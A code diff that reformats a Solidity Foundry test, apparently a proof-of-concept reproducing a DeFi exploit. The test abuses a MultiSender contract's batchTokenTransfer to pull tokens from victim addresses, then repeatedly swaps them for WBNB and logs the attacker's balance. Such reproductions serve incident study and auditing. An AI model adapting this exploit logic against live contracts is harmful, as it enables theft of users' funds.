@@ -49,13 +49,15 @@ contract ContractTest is Test {
             Token[i] = 999_999_999_999_400;
         }
 
-        MultiSender.batchTokenTransfer{value: 1 ether}(Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true);
+        MultiSender.batchTokenTransfer{value: 1 ether}(
+            Victim, Attack, Token, address(MyAi), 999_999_999_999_400 * 100, true
+        );
         for (uint256 i = 0; i < 100; i++) {
             TOKENToWBNB();
         }
         emit log_named_decimal_uint("Attacker WBNB balance before attack", WBNB.balanceOf(address(this)), 18);
     }
-    
+
     function TOKENToWBNB() internal {
         address[] memory path = new address[](2);
         path[0] = address(MyAi);
@@ -64,7 +66,7 @@ contract ContractTest is Test {
             999_999_999_999_400, 0, path, address(this), block.timestamp
         );
     }
-    
+
     fallback() external payable {}
     receive() external payable {}
 }
